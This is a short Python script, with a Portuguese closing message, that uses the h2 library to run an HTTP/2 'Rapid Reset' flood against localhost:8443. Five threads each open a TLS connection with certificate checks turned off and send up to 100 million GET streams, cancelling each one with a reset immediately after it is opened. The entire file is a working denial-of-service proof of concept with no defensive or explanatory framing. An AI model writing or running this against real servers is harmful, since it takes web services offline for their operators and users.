import socket
import ssl
import time
import threading
from h2.connection import H2Connection

HOST = 'localhost'
PORT = 8443
NUM_STREAMS = 100000000
NUM_THREADS = 5

def reset_streams(thread_id):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    sock = socket.create_connection((HOST, PORT))
    conn = context.wrap_socket(sock, server_hostname=HOST)

    h2_conn = H2Connection()
    h2_conn.initiate_connection()
    conn.sendall(h2_conn.data_to_send())

    for stream_id in range(1, NUM_STREAMS * 2, 2):
        headers = [
            (':method', 'GET'),
            (':authority', HOST),
            (':scheme', 'https'),
            (':path', '/'),
        ]
        h2_conn.send_headers(stream_id, headers, end_stream=True)
        conn.sendall(h2_conn.data_to_send())
        h2_conn.reset_stream(stream_id)
        conn.sendall(h2_conn.data_to_send())
        time.sleep(0.01) 

    conn.close()
    print(f"Thread {thread_id} finished.")

threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=reset_streams, args=(i,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Simulação de reset rápido concluída.")
